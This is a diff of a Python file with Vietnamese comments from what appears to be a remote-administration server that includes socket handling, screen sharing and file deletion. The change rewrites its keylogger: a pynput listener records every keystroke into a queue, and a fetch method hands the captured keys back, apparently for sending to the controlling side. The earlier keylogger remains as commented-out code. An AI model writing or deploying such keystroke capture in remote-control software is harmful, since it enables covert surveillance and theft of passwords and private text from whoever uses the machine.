@@ -1,13 +1,12 @@
+
 import json
 import os
 import socket
 import subprocess
 import threading
-import time
-import tkinter as tk
-from tkinter import messagebox
-from tkinter import ttk
 from vidstream import ScreenShareClient
+from queue import Queue
+import pynput.keyboard
 
 import keyboard
 
@@ -17,6 +16,8 @@ class SV_Model:
         self.server_port = server_port
         self.server_socket = None
         self.running = False
+        self.key_events = Queue()
+        self.is_logging = False
 
     def start_server(self):
         try:
@@ -218,38 +219,65 @@ class SV_Model:
             print("File cấu hình không tồn tại.")
             return None, None
 
-    #5. SV_Keylogger:    
-    def start_keylogger():
-        keys_pressed = ""
-        MAX_LINE_LENGTH = 50
-        stop_keylogger = False
-        listener = None
+    #5. SV_Keylogger:   
+    def start_keylogging(self):
+        """Bắt đầu ghi phím."""
+        self.is_logging = True
+        self.listener = pynput.keyboard.Listener(on_press=self._log_key)
+        self.listener.start()
 
-        def on_press(key):
-            nonlocal keys_pressed, stop_keylogger
-            if stop_keylogger:
-                return False
+    def stop_keylogging(self):
+        """Dừng ghi phím."""
+        if self.is_logging:
+            self.is_logging = False
+            self.listener.stop()
 
-            if hasattr(key, 'char') and key.char is not None:
-                key_str = key.char
-            else:
-                key_str = f' {str(key)} '
+    def _log_key(self, key):
+        """Hàm ghi phím."""
+        if self.is_logging:
+            try:
+                self.key_events.put(key.char)
+            except AttributeError:
+                self.key_events.put(f"[{key}]")
 
-            if key == keyboard.Key.enter:
-                keys_pressed = ""
-            else:
-                keys_pressed += key_str
+    def fetch_keys(self):
+        """Trả về danh sách các phím đã ghi."""
+        keys = []
+        while not self.key_events.empty():
+            keys.append(self.key_events.get())
+        return keys
+     
+    # def start_keylogger():
+    #     keys_pressed = ""
+    #     MAX_LINE_LENGTH = 50
+    #     stop_keylogger = False
+    #     listener = None
 
-            return key_str
+    #     def on_press(key):
+    #         nonlocal keys_pressed, stop_keylogger
+    #         if stop_keylogger:
+    #             return False
 
-        listener = keyboard.Listener(on_press=on_press)
-        listener.start()
+    #         if hasattr(key, 'char') and key.char is not None:
+    #             key_str = key.char
+    #         else:
+    #             key_str = f' {str(key)} '
 
-        return listener
+    #         if key == keyboard.Key.enter:
+    #             keys_pressed = ""
+    #         else:
+    #             keys_pressed += key_str
+
+    #         return key_str
+
+    #     listener = keyboard.Listener(on_press=on_press)
+    #     listener.start()
+
+    #     return listener
     
-    def stop_keylogger(listener):
-        listener.stop()
-        return "KEYLOGGER_STOPPED"
+    # def stop_keylogger(listener):
+    #     listener.stop()
+    #     return "KEYLOGGER_STOPPED"
    
     # ---------------- 6. Del_Delete File: ----------------------    
     def validate_file(self, file_path):
